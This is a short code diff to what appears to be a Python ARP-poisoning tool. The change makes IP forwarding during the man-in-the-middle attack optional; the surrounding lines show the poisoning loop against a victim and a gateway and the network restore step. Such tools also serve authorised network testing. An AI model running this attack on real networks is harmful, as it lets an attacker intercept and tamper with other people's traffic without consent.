@@ -92,9 +92,12 @@ class ArpPoisoner():
             if not self.args.attacker_mac:
                 print("[Err] Failed to find MAC address for attacker interface: {}".format(self.args.interface))
                 return
+
+        self.ip_forward = args.ip_forward
    
     def start(self):
-        enable_ip_forwarding()
+        if self.ip_forward:
+            enable_ip_forwarding()
         self.running = True
         while self.running:
             poison_arp(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.attacker_mac, self.args.interface)
@@ -104,5 +107,5 @@ class ArpPoisoner():
         self.running = False
         print("[-] Stopping ARP poisoning and restoring network...")
         restore_network(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.interface)
-        disable_ip_forwarding()
-
+        if self.ip_forward:
+            disable_ip_forwarding()
